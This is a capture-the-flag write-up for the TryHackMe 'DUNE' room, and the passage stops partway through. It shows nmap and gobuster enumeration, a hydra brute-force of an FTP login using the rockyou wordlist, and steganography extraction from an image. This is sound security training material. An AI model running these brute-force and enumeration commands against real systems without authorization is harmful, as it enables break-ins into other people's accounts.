# TryHackMe: DUNE
https://tryhackme.com/room/dune
## 1. Network Enumeration
Use `nmap` to run a quick port scan to see what services are running on the box:

```
$ nmap 10.10.76.115        
                           
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-22 19:09 CET
Nmap scan report for 10.10.76.115
Host is up (0.22s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 29.04 seconds
```
We see that this box is running an FTP, SSH, and HTTP servers. Let's take a look at the HTTP server.
## 2. Web Server
The home page of the web server gives a quick summary of Frank Herbert's sci-fi book DUNE, but doesn't appear to show any other useful information. Lets start `gobuster` to see if we can find any hidden web pages.

```
$ gobuster -u http://<ip-address> -w /usr/share/wordlists/dirb/common.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://<ip-address>/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2024/01/22 19:19:01 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/images (Status: 301)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
=====================================================
2024/01/22 19:20:31 Finished
=====================================================
```

We found an `/images` directory, but nothing there looks particularly interesting. We also found a `robots.txt` file. Let's check it out:

```
User-Agent: *
Disallow: /chapterhouse/
```

Okay, great! Let's check out `/chapterhouse`.

We found our first flag at the bottom of the page: `DUNE{NotTheFlag}`
We also see that Jessica instruct us (Paul) to find Duncah Idaho, and she gives us the key information that Duncan has a weak password. Let's see if we can use the username `duncan` to brute force entry into FTP or SSH.

## 3. FTP

Before we attempt to brute force our way into FTP, let's check if we can login as `anonymous`.

```
$ ftp anonymous@10.10.76.115
Connected to 10.10.76.115.
220 Swordmaster Duncan Idaho's Quarters
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed

```

Anonymous login is not enabled, but we learned that the FTP server is "Duncan Idaho's Quarters". Looks like we're in the right place. Let's try using `hydra`` to brute force Duncan's password using the rockyou.txt wordlist:

```
$ hydra -l duncan -P /usr/share/wordlists/rockyou.txt 10.10.76.115 ftp -t 64
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-22 19:33:30
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://10.10.76.115:21/
[21][ftp] host: 10.10.76.115   login: duncan   password: <redacted>
1 of 1 target successfully completed, 1 valid password found
```

Great, we found a password! Let's login to FTP and have a look around.

```
$ ftp duncan@10.10.76.115                                                   
Connected to 10.10.76.115.
220 Swordmaster Duncan Idaho's Quarters
331 Please specify the password.
Password: duncan
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||59339|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             621 Jan 22 15:32 message.txt
-rw-r--r--    1 0        0          135121 Jan 22 15:32 signet_ring.jpg
226 Directory send OK.
```

There are a couple files present, let's download them both and have a closer look. `message.txt` tells us that Duke Leto left hist signet ring for us, and that it was encrypted with some sort of secret message. Let's examine the `signet_ring.jpg` file.

## Steganography

The image is a picture of the character Duncan Idaho. Let's examine the EXIF data:

```
$ exiftool signet_ring.jpg 
ExifTool Version Number         : 12.40
File Name                       : signet_ring.jpg
Directory                       : .
File Size                       : 132 KiB
File Modification Date/Time     : 2024:01:22 14:25:08+01:00
File Access Date/Time           : 2024:01:22 15:11:34+01:00
File Inode Change Date/Time     : 2024:01:22 15:11:34+01:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : <redacted>
Image Width                     : 1600
Image Height                    : 900
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1600x900
Megapixels                      : 1.4
```

Interesting, the `Comment` field looks like it contains some base64 encoded text. Let's check:

```
$ echo "<redacted>" | base64 --decode
<redacted>
```

It looks like we may have found another password, but for what? I tried logging in to SSH and FTP as the user `paul` with this password, but it did not work. Let's take a closer look at the `signet_ring.jpg` image. Let's try using `steghide` to check if the Duke's secret message was hidden within this image using the password we just found:

```
$ steghide extract -sf signet_ring.jpg
Enter passphrase: <redacted>
wrote extracted data to "hidden.txt".
```

It worked! The hidden message tells us to join the Duke in his private quarters to complete our trianing: /<redacted>

This looks a file path, let's try navigating to /<redacted> on the web server.